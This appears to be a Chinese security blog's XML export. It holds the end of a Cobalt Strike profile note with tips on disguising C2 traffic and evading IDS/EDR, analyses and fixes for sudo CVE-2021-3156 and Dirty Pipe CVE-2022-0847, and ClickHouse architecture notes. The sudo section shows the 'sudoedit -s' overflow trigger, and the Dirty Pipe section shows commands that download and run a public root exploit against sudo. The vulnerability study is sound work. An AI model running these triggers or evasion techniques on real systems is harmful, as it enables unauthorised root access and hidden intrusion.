修改： 必须重启 TeamServer 才能生效新的 profile。


Profile 和 Beacon 是什么关系可以这样理解：



模块
作用



Beacon
负责执行命令 + 回连 Team Server


Profile
规定 Beacon 的“通信外壳”和行为习惯


Team Server
接收 Beacon 的流量，并解析 profile 中规定的结构



可以配置哪些行为


行为类型
示例



回连频率
set sleeptime、set jitter


请求样式
http-get &#123;&#125;、http-post &#123;&#125;


请求内容
metadata、id、post-ex


数据编码
base64、netbios、mask


流量伪装
header、uri、server output


DNS 通信
dns-beacon、maxdns、dns_idle


兼容场景
os_arch、http-stager 块



实战中怎么用 profile
配合上线场景：伪装成公司常访问的 API（CDN、云盘等）；
绕过 IDS&#x2F;EDR：改掉 Beacon 的默认路径、头部、包结构；
针对性生成 payload：一个 profile 一个 Beacon 风格。

]]></content>
      <tags>
        <tag>C2</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-3156</title>
    <url>/2025/04/17/CVE-2021-3156/</url>
    <content><![CDATA[漏洞原理在sudo的parse_args()函数中，重写了argv，将命令行的参数存储到cmnd中(587-595行)，将参数中的字母数字_-$以外的字符，也就是元字符，前面加上反斜杠\来转义处理（590-591行）
571     if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; 572         char **av, *cmnd = NULL; 573         int ac = 1; ... 581             cmnd = dst = reallocarray(NULL, cmnd_size, 2); ... 			// 将命令行的参数存储到dst,即cmnd中587             for (av = argv; *av != NULL; av++) &#123; 588                 for (src = *av; *src != &#x27;\0&#x27;; src++) &#123; 589                     // 除了字母数字_-$以外的字符，前面加上反斜杠\来转义590                     if (!isalnum((unsigned char)*src) &amp;&amp; *src != &#x27;_&#x27; &amp;&amp; *src != &#x27;-&#x27; &amp;&amp; *src != &#x27;$&#x27;) 591                         *dst++ = &#x27;\\&#x27;; 592                     *dst++ = *src; 593                 &#125; 594                 *dst++ = &#x27; &#x27;; 595             &#125; ... 600             ac += 2; /* -c cmnd */ ... 603         av = reallocarray(NULL, ac + 1, sizeof(char *)); ... 		// 根据cmnd重写argv和argc609         av[0] = (char *)user_details.shell;610         if (cmnd != NULL) &#123; 611             av[1] = &quot;-c&quot;; 612             av[2] = cmnd; 613         &#125; 614         av[ac] = NULL; 615  616         argv = av; 617         argc = ac; 618     &#125;



之后，在sudoers_policy_main()，set_cmnd()函数中，会把前面重写的argv进行解析，解析的内容存储到user_args变量中，在解析时对使用反斜杠\的字符进行反转义处理时（590-591行），逻辑出现问题
819     if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; ... 852             for (size = 0, av = NewArgv + 1; *av; av++) 853                 size += strlen(*av) + 1; 854             if (size == 0 || (user_args = malloc(size)) == NULL) &#123; ... 857             &#125; 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; ... 864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; 865                     while (*from) &#123;     						// 当遇到反斜杠字符，且下一个字符不是空白字符时，会跳过866                         if (from[0] == &#x27;\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) 867                             from++; 868                         *to++ = *from++; 869                     &#125; 870                     *to++ = &#x27; &#x27;; 871                 &#125; ... 884             &#125; ... 886     &#125;



如果命令行参数是以一个单独的反斜杠\结尾的，比如test\，就会出现问题：

首先会将test\中的 t e s t 逐个传递给to变量，也就是user_args变量，然后当循环到\时，情况如下 
首先在866行，from[0]是一个反斜杠，并且from[1]是null终止符，这里要注意null终止符并不是空白字符，也就是isspace函数返回值为否，判断通过 
在867行，会对from进行加一，此时from指向的就是刚才的from[1]，也就是一个null终止符 
在868行，会将当前的from的内容，即null终止符传递给to变量，即user_args变量，并且from再次加一，这时from已经超出了命令行参数的边界了 
之后整个while循环会继续运行，把超出命令行参数边界的字符也传递给user_args变量

因为user_args在852-853行，已经指定了user_args变量申请的堆的大小，而上面的循环中却把越界的内容传递给了user_args，因此set_cmnd()函数存在堆溢出漏洞
但是，如何把一个单独的反斜杠结尾的字符作为命令行参数，传递到set_cmnd()函数中呢？
回到前面的parse_args()函数中，在590-591行，对元字符（字母数字_-$以外的字符）前面加了反斜杠处理，也就是说，如果某个参数是test\，那么经过parse_args()函数后，就会变成test\\，然后进入到set_cmnd()函数，此时不会出现堆溢出的情况**(为什么****test\\**不会溢出，过程是怎样的)，那么如何才能只传递test\到set_cmnd()函数这里呢？
回到571行，关于MODE_RUN和MODE_SHELL的条件判断，满足这个条件才会对参数中的元字符前面加上反斜杠处理
571     if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;



在819行和858行，满足这两处判断才能到达存在堆溢出漏洞的代码
819     if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; ... 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;



那么可以有这样一个想法：满足819行和858行的判断条件，并且不满足571行的判断条件，这样就能把test\不经过元字符处理传递到堆溢出漏洞的代码处

首先，要满足858行，可以通过-s参数设置MODE_SHELL，或者通过-i参数可以同时设置MODE_LOGIN_SHELL和MODE_SHELL，这两种均可 
那么接下来，就需要不满足MODE_RUN，并且满足MODE_EDIT或MODE_CHECK（这个条件是怎么得出来的）

sudo的mode参数和flags参数是通过sudo命令执行时的参数来确定的，对sudo的参数进行研究，主要为-e参数和-l参数，代码如下：
358                 case &#x27;e&#x27;: ... 361                     mode = MODE_EDIT; 362                     sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; 363                     valid_flags = MODE_NONINTERACTIVE; 364                     break; ... 416                 case &#x27;l&#x27;: ... 423                     mode = MODE_LIST; 424                     valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST; 425                     break; ... 518     if (argc &gt; 0 &amp;&amp; mode == MODE_LIST) 519         mode = MODE_CHECK; ... 532     if ((flags &amp; valid_flags) != flags) 533         usage(1);



如果使用-e参数，会设置MODE_EDIT，并且在363行设置了有效的flags，其中没有包括MODE_SHELL这将会导致无法满足858行的判断条件，因此不符合
如果使用-l参数，会设置MODE_CHECK，并在424行设置有效的flags，其中也没有包括MODE_SHELL，也会导致无法满足858行的判断条件，因此使用-l参数也不行
看起来要满足819行和858行，并且不满足571的判断条件是做不到了，怎么办？
这时就涉及到sudoedit命令了，sudoedit其实本体就是sudo二进制文件，不过是将sudo二进制文件改了个名字叫做sudoedit而已
所以下面还是查看sudo的源码，有这样一个漏洞：
127 #define DEFAULT_VALID_FLAGS     (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL) ... 249     int valid_flags = DEFAULT_VALID_FLAGS; ... 267     proglen = strlen(progname); 268     if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, &quot;edit&quot;) == 0) &#123; 269         progname = &quot;sudoedit&quot;; 270         mode = MODE_EDIT; 271         sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; 272     &#125;



在268行，如果程序名的后四位为edit，就设置mode为MODE_EDIT
通过下面的命令，就能同时设置MODE_EDIT和MODE_SHELL，成功到达存在堆溢出漏洞的代码了：
sudoedit -s



然后想要实现堆溢出，就需要反斜杠参与，可以尝试下面的命令进行溢出
sudoedit -s &#x27;\&#x27; `perl -e &#x27;print &quot;A&quot; x 65536&#x27;`



从攻击者的角度思考，这个堆溢出漏洞是很理想的：

user_args申请的堆的大小是可控的
堆溢出的内容也是可控的
攻击者可以向溢出的内容加入null终止符

漏洞复现通过提前搭建好的docker镜像来复现，里面有sudo源码，exp，pwndbg，复现的同时也便于进行分析
docker pull chenaotian/cve-2021-3156



漏洞修复存在漏洞的代码主要是这个逻辑判断存在问题
if (from[0] == &#x27;\\&#x27; &amp;&amp; !isspace((unsigned char)from[1]))



可以采用简单直接的方式进行修改：增加一个逻辑判断
if (from[0] == &#x27;\\&#x27; &amp;&amp; !isspace((unsigned char)from[1]) &amp;&amp; from[1]!=&#x27;\0&#x27;)



制作修复补丁：
diff -uNr a b &gt; CVE-2021-3156.patch		制作补丁，该补丁是给a打的，如果打了该补丁a就会和b一样，-u可以调整输出的格式更规范一些, -N确保正确处理新增和删除的文件, -r递归处理子目录，应该是文件夹都需要用-r来处理patch -p0 &lt; CVE-2021-3156.patch	打补丁，-p0说明当前目录的级数为0级patch -p0 -RE &lt; CVE-2021-3156.patch	取消刚才打的补丁



修复验证通过下面命令重新编译安装sudo
./configuremakemake install



然后重新运行exp，无法成功获取到shell，说明修复成功
deb打包mkdir sudo-custom/DEBIAN -pmkdir sudo-custom/usr/local/bin -pvim sudo-custom/DEBIAN/control



内容如下
Package: sudo-customVersion: 1.0-1Architecture: amd64Maintainer: user*** &lt;pu*****@he***.world&gt;Description: hello,worldDepends: libc6(&gt;= 2.26)



继续执行
cp /root/sudo-1.8.21/src/sudo /root/sudo-custom/usr/local/bin/sudocp /root/sudo-1.8.21/src/.libs /root/sudo-custom/usr/local/bin/.libs -rdpkg-deb -b sudo-custom /root/sudo-custom.debdpkg -i sudo-custom.debsudo whoami



]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0847</title>
    <url>/2025/04/11/CVE-2022-0847/</url>
    <content><![CDATA[CVE-2022-0847漏洞原理管道(pipe)pipe是linux内核提供的一个通信管道，可以通过pipe()函数创建，通过pipe()函数可以获取到两个文件描述符，分别负责接受数据和发送数据。pipe是以页的形式进行管理，通常pipe缓存空间总长度为65536字节，也就是16页,16个页以数组的方式进行存储，组成一个环形链表的结构(pipe-&gt;bufs[0]~pipe-&gt;bufs[15])，pipe有两个链表指针，一个负责写(pipe-&gt;head)，一个用来读(pipe-&gt;tail)。
通过对pipe进行写操作时，会调用到pipe的pipe_write()函数，下面主要对该函数进行简单介绍：该函数中存在两个逻辑：

如果当前负责写的链表指针(pipe-&gt;head)指向的页的flags标志位存在PIPE_BUF_FLAG_CAN_MERGE，并且写入指定长度后不会出现跨页，那么就会继续往这个页中写入数据。
如果不能在当前页续写，就会重新申请一个页，并且新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE至于为什么第二点要把新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE，因为对于pipe来说，默认状态下是允许对页进行续写的，这样可以节省空间。

Linux内核page cache机制linux 文件缓存页(page cache)是Linux内核中用于缓存文件系统数据的一种机制，当一个进程访问一个文件时，内核会首先检查这个文件是否已经被缓存到页缓存中。如果文件已经被缓存，则内核会直接从页缓存中读取数据并返回给进程，避免了从磁盘中读取数据的开销。如果文件没有被缓存，则内核会将文件的数据读取到页缓存中，并从缓存中返回数据给进程，以提高性能。文件缓存页会在内核层的内存中存留一段时间(可能会一直持续到下次重启电脑)。
splice()系统调用splice()系统调用是零拷贝技术的其中一种，可以自行学习零拷贝相关知识，但在此处对理解漏洞影响不大。splice零拷贝的方式就是，直接让pipe的缓存页指向文件缓存页，也就是使pipe-&gt;bufs[x]-&gt;page直接指向page cache。这一部分主要由splice()系统调用下的copy_page_to_iter_pipe()函数来实现但是copy_page_to_iter_pipe()函数中，在将pipe的缓存页指向文件缓存页后，并没有把pipe的缓存页的flags标志位初始化，形成了一个未初始化漏洞。
漏洞场景为什么说这是一个漏洞？考虑这样一个情景：

申请一个pipe，并且向其中写入数据，把pipe的16个页全部写满一遍，那么根据pipe的pipe_write()函数的第二个逻辑，整个pipe的16个缓存页的flags标志位都会设置PIPE_BUF_FLAG_CAN_MERGE
再通过读操作，把pipe的全部内容读取一遍，此时pipe将会被认定为一个空的管道(pipe是一个环形链表，全部读一遍之后两个链表指针又回到了初始状态)，但是pipe中的16个缓存页的flags标志位依旧设置有PIPE_BUF_FLAG_CAN_MERGE，并没有被清除掉。
然后通过splice()系统调用，将文件A的文件缓存页传递给pipe的缓存页，假设该pipe的缓存页为pipe-&gt;bufs[2]，那么此时pipe-bufs[2]的flags依旧设置有PIPE_BUF_FLAG_CAN_MERGE，也就是说，如果继续向pipe写入数据，并且写入数据长度不会出现跨页的情况，就能继续向bufs[2]里续写，尽管bufs[2]此刻已被判断为是文件A
继续向pipe中写入一段数据，只要写入的长度不会导致跨页，就会直接对内核中的文件缓存页的内容进行修改，之后如果访问文件A，那么根据Linux内核page cache机制，将会直接获取到内存中的文件A的内容。相当于实现了对可读文件暂时性的任意写的功能。

其实上述的情景就是一些EXP的攻击思路了，如果能够理解这个情景将会对之后理解EXP有很大帮助。
漏洞复现wget https://haxx.in/files/dirtypipez.cgcc dirtypipez.c -o dirtypipez./dirtypipez `which sudo`



漏洞利用脚本分析查看https://haxx.in/files/dirtypipez.c的源码进行分析：
prepare_pipe()函数负责将pipe的全部缓存页的flags设置PIPE_BUF_FLAG_CAN_MERGE,其实就是做了上述情景的前两步hax()函数负责向指定文件写入指定的内容，其思路与上述情景一致通过向具有SUID特权位的文件(这也是使用which sudo作为参数的原因)写入内容，然后执行，实现任意代码执行的效果。
漏洞修复漏洞根本原因在于splice()系统调用的copy_page_to_iter_pipe()函数没有初始化flags，因此在其中加入这样一行代码即可：
buf-&gt;flags=0;

]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞复现</tag>
        <tag>Linux Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Clickhouse</title>
    <url>/2025/04/11/Clickhouse/</url>
    <content><![CDATA[ClickHouse的架构与设计理念ClickHouse的整体架构概览ClickHouse 是一个开源的列式数据库，由 Yandex 开发，专为 在线分析处理（OLAP） 场景而设计。它的架构设计强调 高吞吐、低延迟 和 可横向扩展。
架构核心组件

Server 节点
ClickHouse 的基本运行单位是一个服务进程（通常是一个 clickhouse-server 实例），它负责处理客户端请求、执行查询、管理存储等。


表引擎（Table Engines）
表的存储和管理依赖引擎，最核心的是 MergeTree 及其衍生类型（如 ReplacingMergeTree、SummingMergeTree）。
每种引擎定义了数据如何存储、如何合并、如何处理TTL等规则。


查询引擎（Query Processor）
查询经过解析器 → 分析器 → 优化器 → 执行器的层层处理。
查询最终会被向量化处理，高效执行。


分布式支持
通过 Distributed 表引擎实现横向扩展，支持分布式存储与查询。
使用 ZooKeeper 协调副本、分片、故障恢复。


系统表（system. 系列）
ClickHouse内部维护了大量系统表，可用于监控、诊断、调优。




列式数据库的设计理念与优势ClickHouse 是列式存储的数据库，这意味着它将每一列的数据单独存储在磁盘上，而不是传统行式数据库那样按行存储。
优势包括：

更高的压缩率：同一列中的数据类型一致，便于压缩算法发挥最大效能。
更快的读取速度：只读取查询涉及的列，IO 开销极低。
高效的向量化计算：将列数据作为批处理单位，提升 CPU 使用效率。


MergeTree 表引擎基础概念MergeTree 是 ClickHouse 中最重要的表引擎，几乎所有的功能（如排序键、TTL、物化视图）都建立在它之上。
核心特性：

分区（partition by）：将数据按照某个维度分区管理，提高查询效率与数据管理灵活性。
主键（order by）：数据在写入时按照主键进行有序组织，支持范围查找和跳跃索引,。
数据分片（parts）：数据不是整体存储，而是以“Part”为单位增量写入。
后台合并（Merge）：ClickHouse定期将小的Part合并为大的Part，优化读取性能和空间利用率。


Clickhouse的主键与Mysql的主键的区别在 ClickHouse 和 MySQL 中，主键的概念有所不同，因为这两个数据库系统的设计目标和架构有所区别。虽然两者的主键都用于唯一标识记录，但它们的实现方式和作用有所不同。
MySQL 主键
定义：
在 MySQL 中，主键是一个或多个列的组合，用于唯一标识表中的每一行记录。主键必须是唯一的，并且不能为 NULL。


存储与索引：
在 MySQL 中，主键不仅是唯一标识符，它还会自动创建一个 聚簇索引（Clustered Index）。这意味着数据行会按照主键的顺序存储在磁盘上，主键的顺序决定了物理存储的顺序。
如果主键由多个列组成，那么这些列的组合会共同决定记录在数据库中的存储顺序。


索引类型：
MySQL 的主键通常是基于 B+树索引，适合高效的范围查询和单个记录的查找。B+树索引使得在查找时可以快速定位到对应的行。


作用：
唯一性：主键确保每一行数据在表中的唯一性。
查询效率：由于主键是聚簇索引，它可以显著提高查询性能，尤其是通过主键查找记录时。



ClickHouse 主键
定义：
在 ClickHouse 中，主键并不像传统数据库（如 MySQL）那样是唯一约束的索引。ClickHouse 的主键主要用于数据的 排序，而不是用于唯一性约束。
主键是通过 ORDER BY 子句定义的，用来指定数据在存储时的排序顺序。数据并不要求唯一，主键更多的是决定存储方式，以优化查询性能。


存储与索引：
在 ClickHouse 中，表中的数据并不按主键的顺序存储，而是按照 MergeTree 引擎的排序规则存储。通过主键指定的排序列决定了数据的 物理存储顺序，这有助于优化按这些列进行的查询。
ClickHouse 的主键不会像 MySQL 那样创建聚簇索引。ClickHouse 的 MergeTree 引擎使用 数据部分（parts） 来存储数据，并通过索引文件（primary key index）来加速查询。


索引类型：
ClickHouse 使用的是 稀疏索引（Sparse Index），它与 B+ 树的传统索引不同。ClickHouse 通过在数据块中存储列的最小值和最大值来构建索引，以优化范围查询。主键定义了如何在这些数据块中进行查询和定位。


作用：
排序优化：主键的定义帮助 ClickHouse 对数据进行排序，这对于按排序列进行的范围查询非常有效。
没有唯一性约束：与 MySQL 的主键不同，ClickHouse 中的主键并不强制保证唯一性，它仅用于优化查询。
性能优化：主键列通常是查询中常用的列，特别是当这些列用于 ORDER BY 或 WHERE 子句时，排序和索引能够大幅提升查询性能。



主要区别
唯一性：
MySQL：主键必须唯一，并且每个表只能有一个主键。
ClickHouse：主键不保证唯一性，它只用于数据的排序优化，不强制要求唯一。


物理存储：
MySQL：主键对应的列会影响物理存储顺序，因为主键是聚簇索引，数据行存储的顺序与主键顺序一致。
ClickHouse：主键影响数据的排序顺序，但不控制数据的物理存储顺序。主键只是优化查询的一个手段，数据本身并不要求按照主键排序存储。


索引结构：
MySQL：主键使用聚簇索引，基于 B+ 树，适用于范围查询和精确查找。
ClickHouse：主键使用稀疏索引，并通过 MergeTree 引擎优化数据分布，更多的是用于查询优化而不是唯一性验证。


查询性能：
MySQL：由于主键的聚簇索引，MySQL 对主键相关查询非常高效，特别是精确查找。
ClickHouse：主键通过控制数据的物理排序来优化范围查询和批量数据访问，特别是在按主键排序的查询中，性能有显著提升。



总结
MySQL 的主键主要是用来保证数据的唯一性，并且通过聚簇索引加速查询。
ClickHouse 的主键并不要求唯一性，而是主要用于 数据排序 和 查询优化，特别是在使用 MergeTree 引擎时，通过主键来定义数据的存储顺序，优化范围查询。


底层数据结构ClickHouse 的列式存储格式ClickHouse 是原生的列式数据库，它将每一列的数据单独存储为多个文件，而不是一整行。

每列的数据存储结构
对于每个字段，ClickHouse 可能生成如下几种文件（以 MergeTree 表为例）：

.bin（或无后缀）：列的实际数据文件（经过编码与压缩）
.mrk3：mark文件，用于快速定位数据块中的位置
.idx（bitmap索引等引擎特有）：
.default：记录 default 表达式结果（如果有）

这些文件按列存储，并以 part 为单位组织在磁盘上。每个 part 包含所有列的若干数据段。

数据组织单位：PartClickHouse 的写入不是直接追加数据，而是每次写入都会生成一个新的 Part。

Part 的核心特点：

是不可变的（immutable）
存储在磁盘上一个独立的目录中
包含分区信息、索引、数据列文件、元数据文件
文件结构：

all_0_0_0/  columns.txt  primary.idx  checksums.txt  data/    column1.bin, column1.mrk3    column2.bin, column2.mrk3


Part 的命名结构：
格式为 &#123;partition&#125;_&#123;min_block&#125;_&#123;max_block&#125;_&#123;level&#125;，例如：

202404_1_10_1 表示：
分区是 202404
包含的块号是从1到10
合并层级为1



ClickHouse 会通过后台合并机制把多个 Part 合并成一个更大的 Part，减少碎片、优化查询。

主键与索引机制ClickHouse 的主键不是唯一性约束，而是数据的物理排序依据，用于范围查找优化。
主键索引（primary.idx）
以每 N 行（默认8192）为一个数据块，对主键字段建立 min&#x2F;max 索引。
存储在 primary.idx 中，每个 entry 对应一段数据的起始位置。
查询时可快速跳过不匹配的数据块（称为 粗粒度索引）。

Skip Index（二级索引）ClickHouse 还支持一些可选的辅助索引，用于跳过数据块：

minmax（最常用）：为某列记录每块的 min&#x2F;max
set：记录块中出现过的值集合
bloom_filter：用于模糊匹配
ngrambf_v1：支持 LIKE ‘%xxx%’ 模糊匹配优化

这些索引不会影响写入，但能显著提升过滤性能。

数据压缩与编码策略ClickHouse 支持非常高效的压缩机制，是其性能的关键之一。
压缩流程：
每列数据按 block 写入（默认最大64KB）
每个 block 使用 LZ4（或 ZSTD）压缩
某些数据类型还会使用 特殊编码策略：
整型：Delta 编码、Gorilla 编码
字符串：Dictionary 编码
Nullable：使用 bitmap 分离空值位图
LowCardinality：将字符串字段转为整数字典引用



压缩率常常达到 5～10 倍，远高于行式数据库。

分区（Partition）与分片（Shard）ClickHouse 将数据分为多个 分区（partition），每个分区下有多个 part。

分区是逻辑组织单位，如按月、按日划分。
写入新分区的数据不会触发旧分区的合并。
分区字段常设为 toYYYYMM(date) 形式。

**分片（shard）**则是跨节点水平分布的数据副本，属于分布式部署概念，不直接影响本地数据结构。分片主要用于 水平扩展（Horizontal Scaling），通过将数据分布到不同的节点，来支持大规模数据的处理和存储。分片 是水平划分的，每个分片存储整个表的一部分数据，通常是按某种规则（如 Hash 或范围划分）将数据均匀分布到多个节点
分片的特性

跨节点分布：
分片是 跨多个节点的数据分布，通常是为了提高系统的容量和处理能力。每个节点存储数据的一部分，这些部分被称为 分片（shard）。
分片 是水平划分的，每个分片存储整个表的一部分数据，通常是按某种规则（如 Hash 或范围划分）将数据均匀分布到多个节点。


数据副本（Replica）：
分片 和 副本 是分布式部署的核心概念。每个分片通常会有一个或多个 副本，副本用于容错和高可用性。当一个节点或分片出现故障时，系统可以自动从副本中恢复数据，保证服务的可用性。
副本通常是分布式表的一部分，每个副本存储与其他副本相同的数据，但存储在不同的节点上。


分片和查询：
当查询是针对整个表进行的，Distributed 引擎会自动将查询请求分发到相应的分片节点。分片负责处理本地数据并返回查询结果。
通过使用分片，ClickHouse 能够支持大规模数据集的分布式查询，避免单节点过载，同时提高查询吞吐量。




TTL 与数据生命周期ClickHouse 支持在表级或字段级设置 TTL，用于自动删除或移动数据。
例如：
TTL event_time + INTERVAL 30 DAY DELETE

执行原理：

ClickHouse 后台定时任务扫描符合 TTL 条件的数据块
构造新的 Part（删除或迁移）
替换旧 Part，旧数据自动清理

这一机制也依赖 Part 的不可变性与自动合并能力。

小结
数据是以列为单位存储在磁盘上的，每列有自己的 .bin 和 .mrk3 文件。
数据写入生成不可变的 Part，后台进行合并优化。
主键索引和辅助索引实现了高效的数据跳过（跳跃式扫描）。
压缩、编码机制帮助 ClickHouse 在磁盘和内存间取得性能平衡。
Partition 逻辑管理数据生命周期与并发写入。
TTL 自动清理机制基于 Part 和合并逻辑运行。


分布式查询执行机制当查询一个 Distributed 表时：

查询在本地生成逻辑执行计划
然后分发到每个分片的本地 MergeTree 表执行
每个分片执行完返回结果，主节点进行 Merge&#x2F;Aggregate

ClickHouse 会自动判断是否进行 聚合下推、过滤下推，从而减少跨网络传输。

存储引擎与文件系统交互机制MergeTree 表引擎的核心机制MergeTree 是 ClickHouse 中最重要、最通用的表引擎。它支持有序写入、延迟合并、高效读取、TTL 清理等机制。
设计目标

高并发写入（append-only + 异步合并）
快速查询（主键索引 + mark 跳跃）
灵活数据管理（分区、TTL、物化视图）

MergeTree 是列式、不可变、基于 LSM 思路的引擎，但不同于 RocksDB 那种 key-value 模型，它以 block 和 column 为单位组织数据。

数据写入流程详解
写入内存
接收 insert 数据，形成内存中的 Block


数据编码 + 压缩
对每列进行编码、压缩处理


落盘成 Part
每次 insert 都生成一个新的 Part，保存在磁盘上一个独立目录中


更新元数据
包括 columns.txt, checksums.txt, partition.dat, count.txt
同时更新主键索引文件（如 primary.idx）



写入流程采用批量式写入 + 不可变数据块，避免了行级锁和复杂并发控制。

磁盘文件结构每个 Part 的文件组织如下：
202404_1_10_1/├── columns.txt         -- 记录所有字段├── checksums.txt       -- 所有文件校验信息├── count.txt           -- 行数├── partition.dat       -- 分区值├── primary.idx         -- 主键索引（粗粒度）├── column1.bin         -- 实际数据（压缩编码后）├── column1.mrk3        -- mark 文件（跳跃索引）├── ...

每列对应两个文件：

.bin：压缩列数据
.mrk3：跳跃索引（每 N 行标记偏移）

这种结构易于横向扩展（按列、按分区）和快速定位。

mark 文件的作用Mark 文件（.mrk3）用于支持 跳跃式扫描，原理是：

每隔 N 行记录一个 “mark”
每个 mark 保存当前列文件偏移位置（如偏移量、压缩块内位置）
查询时可快速 seek 到指定 mark，避免线性扫描

默认一个 mark 间隔 8192 行（可调），决定了 I&#x2F;O 粒度和内存消耗的权衡。

Part 的合并（Merge）机制为了防止磁盘碎片和读取效率下降，ClickHouse 会定期触发后台合并任务。
合并流程：
挑选多个小 Part（同一分区内）
解压 + 解码后 merge 成一个大 Part
重新编码、压缩、写入新文件
替换旧 Part，更新元数据

合并采用多线程并发执行，支持 IO 限速、按策略排序（如 TTL 优先、大小优先）
可通过 system.merges 观察合并状态。

磁盘空间策略（Disk &amp; Volume）ClickHouse 从 v20+ 支持将数据分布在多个磁盘&#x2F;目录上。
存储策略（StoragePolicy）通过定义 Disk, Volume, StoragePolicy：
&lt;storage_configuration&gt;  &lt;disks&gt;    &lt;disk1&gt;      &lt;path&gt;/var/lib/clickhouse/disk1/&lt;/path&gt;    &lt;/disk1&gt;    &lt;disk2&gt;      &lt;path&gt;/mnt/nvme/&lt;/path&gt;    &lt;/disk2&gt;  &lt;/disks&gt;  &lt;policies&gt;    &lt;hot_to_cold&gt;      &lt;volumes&gt;        &lt;hot&gt;          &lt;disk&gt;disk1&lt;/disk&gt;        &lt;/hot&gt;        &lt;cold&gt;          &lt;disk&gt;disk2&lt;/disk&gt;        &lt;/cold&gt;      &lt;/volumes&gt;    &lt;/hot_to_cold&gt;  &lt;/policies&gt;&lt;/storage_configuration&gt;

可以实现：

热数据存 NVMe，冷数据归档到 SATA
配合 TTL 进行分级迁移


缓存机制（Mark Cache、Uncompressed Cache）ClickHouse 为提高查询性能，设计了两级缓存：

Mark Cache（默认2GB）
缓存 mark 文件（跳跃索引），避免频繁读取 .mrk3
作用：快速定位数据位置


Uncompressed Cache（默认8GB）
缓存解压后的数据块（Block）
作用：避免重复解压、提高重复查询速度



这两个缓存都驻留内存，可通过配置调整大小，适当扩大可明显提升查询性能。

其他存储优化技术
Zero Copy Replication：副本之间通过共享存储（如 S3、NFS）进行数据同步，避免拷贝
分区裁剪：查询时自动忽略无关分区，减少读取
Compact Part：小文件写入场景下启用“紧凑格式”Part，适合日志写入
TTL MOVE TO DISK：数据分层迁移 + 自动清理


小结
MergeTree 的核心机制基于 Part，不可变、易合并、列存
Part 文件结构详尽：数据 + 索引 + 校验 + 元数据
mark 索引为跳跃式扫描提供支持
后台合并优化性能、释放空间
多磁盘策略与缓存机制提升资源利用效率


实战分析与源码学习系统表分析ClickHouse 提供大量以 system. 开头的系统表用于实时观察数据库内部状态，非常适合用于：

查询调优
瓶颈定位
资源消耗监控
数据合并与副本同步监控


常用系统表



表名
作用



system.parts
查看表中各个 Part 的信息（大小、状态、压缩率等）


system.merges
当前正在进行的合并任务


system.replication_queue
副本同步队列，观察主从同步延迟


system.processes
当前正在执行的查询及其资源消耗


system.query_log
所有历史查询的执行日志（可配置保存时间）


system.text_log
ClickHouse 后台运行日志


system.metrics
实时系统性能指标，如内存、线程、cache 命中率


system.events
查询过程中触发的事件统计，例如 SelectedParts, SelectedRows


system.trace_log
CPU 栈追踪信息（用于定位复杂查询中的热点函数）


通过结合 EXPLAIN 和 system.query_log，可以完整还原一次查询的执行过程。

查询慢的问题定位思路
分析查询计划

EXPLAIN PLAN SELECT ...

查看是否存在全表扫描、JOIN 不走索引、聚合位置错误等。

查看实际执行信息

SELECT * FROM system.query_log WHERE query_id = &#x27;...&#x27;

包括读取的 part 数量、rows read、bytes read、memory usage 等。

检查合并状态

SELECT * FROM system.merges WHERE table = &#x27;your_table&#x27;

频繁合并可能拖慢查询。

辅助索引是否生效 使用 EXPLAIN PIPELINE 查看是否启用了 min-max、bloom 过滤器。


ClickHouse 源码结构总览ClickHouse 的源码相对庞大，但结构清晰，主要分为以下几个核心模块（位于 src/ 目录）：
核心模块结构


路径
内容



src/Storages/
各种表引擎，如 MergeTree、Kafka、Memory、Distributed


src/Interpreters/
查询解析与执行计划生成模块


src/Processors/
执行器中的算子和执行 pipeline 实现


src/Columns/
列类型的实现（支持类型系统、向量化）


src/DataTypes/
数据类型定义与转换


src/IO/
文件读写、压缩、缓冲层、缓存策略


src/Parsers/
SQL 解析器（AST 构建）


src/Common/
公共基础库，包括多线程、锁、内存池等


src/Core/
全局上下文定义、查询 ID 管理等



MergeTree 家族所有 MergeTree 系列表引擎都有以下共同能力：

列式存储（高压缩、按需读取）
主键有序（支持范围过滤）
分区写入（支持按时间或字段拆分）
数据 append-only（不可变 Part）
后台合并（异步合并优化读取性能）
TTL 支持（按行&#x2F;列自动清理或迁移）
支持并发读写、高吞吐 insert
支持多副本复制（Replicated 变体）


MergeTree 家族成员一览


引擎名称
特殊能力
典型使用场景



MergeTree
无特殊行为
通用查询、分析型写入


ReplacingMergeTree
删除重复数据（可选版本字段）
幂等写入、幂等去重更新


SummingMergeTree
聚合同主键数据
实时累计、指标类数据


AggregatingMergeTree
支持复杂状态聚合合并
用户自定义聚合（UDF、HLL）


CollapsingMergeTree
按标志列合并正负事件
日志型数据，标记删除


VersionedCollapsingMergeTree
同上 + 版本控制
日志场景下精确回滚


GraphiteMergeTree
针对 Graphite 监控数据设计
时间序列归档、聚合、清洗


还有对应的副本版本：

ReplicatedMergeTree（+ 所有以上派生变体都可用 ReplicatedXXXMergeTree 实现多副本）


关键变体深度解析ReplacingMergeTree特点：
根据主键合并 重复行（可选提供 version 字段）
多条相同主键的记录，保留“最新”版本（如果定义了 version）

底层行为：
合并过程中比较是否主键相同：
无版本字段：保留其中任一条（不确定性）
